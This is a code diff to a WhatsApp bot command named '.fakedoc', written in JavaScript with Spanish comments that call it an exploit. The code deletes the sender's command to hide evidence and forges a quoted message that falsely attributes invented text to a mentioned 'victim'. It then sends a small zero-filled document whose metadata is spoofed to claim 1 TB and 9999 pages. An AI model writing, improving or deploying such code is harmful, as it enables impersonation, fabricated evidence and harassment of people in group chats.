@@ -9,16 +9,19 @@ export default {
         if (!isGroup) return sock.sendMessage(remitente, { text: "❌ Este exploit solo tiene sentido en grupos." }, { quoted: msg });
 
         const mentionedJid = msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
-        if (!mentionedJid) return sock.sendMessage(remitente, { text: "❌ Menciona a la víctima. Ej: .fakedoc @user pásame el archivo" });
+        if (!mentionedJid) return sock.sendMessage(remitente, { text: "❌ Menciona a la víctima. Ej: .fakedoc @user texto inventado" });
 
+        // Extracción limpia del texto falso (igual que en .fake)
         let textoFalso = textoLimpio.replace(/^\.fakedoc\s+/i, '').replace(/@\d+/g, '').trim();
+        
+        // Si el usuario olvida poner texto, entra el predeterminado
         if (!textoFalso) textoFalso = "¿Tienes el trabajo de física listo?";
 
         try {
-            // 1. Destrucción de la evidencia
+            // 1. Destrucción de la evidencia (sigilo)
             try { await sock.sendMessage(remitente, { delete: msg.key }); } catch (e) {}
 
-            // 2. Construcción de la cita fantasma
+            // 2. Construcción de la cita fantasma en memoria
             const mensajeInyectado = {
                 key: {
                     fromMe: false,
@@ -28,10 +31,10 @@ export default {
                 message: { conversation: textoFalso }
             };
 
-            // 3. Generamos un documento minúsculo real (12 KB) para no quemar la RAM de tu VPS
+            // 3. Buffer de 12 KB para no saturar la RAM de la VPS
             const corruptBuffer = Buffer.alloc(12 * 1024);
 
-            // 4. Pre-subida silenciosa a los servidores de WhatsApp
+            // 4. Subida silenciosa del payload
             const media = await prepareWAMessageMedia(
                 { 
                     document: corruptBuffer, 
@@ -41,12 +44,11 @@ export default {
                 { upload: sock.waUploadToServer }
             );
 
-            // 5. EXPLOIT DE PROTOCOLO: Modificación cruda de metadatos
-            // 1 Terabyte = 1099511627776 bytes
+            // 5. Spoofing de metadatos (1 TB = 1099511627776 bytes y 9999 páginas)
             media.documentMessage.fileLength = "1099511627776"; 
-            media.documentMessage.pageCount = 9999; // Mentimos sobre la cantidad de páginas
+            media.documentMessage.pageCount = 9999; 
 
-            // 6. Empaquetado final y envío del mensaje interceptado
+            // 6. Empaquetado final y ejecución
             const waMsg = generateWAMessageFromContent(remitente, {
                 documentMessage: media.documentMessage
             }, { quoted: mensajeInyectado });
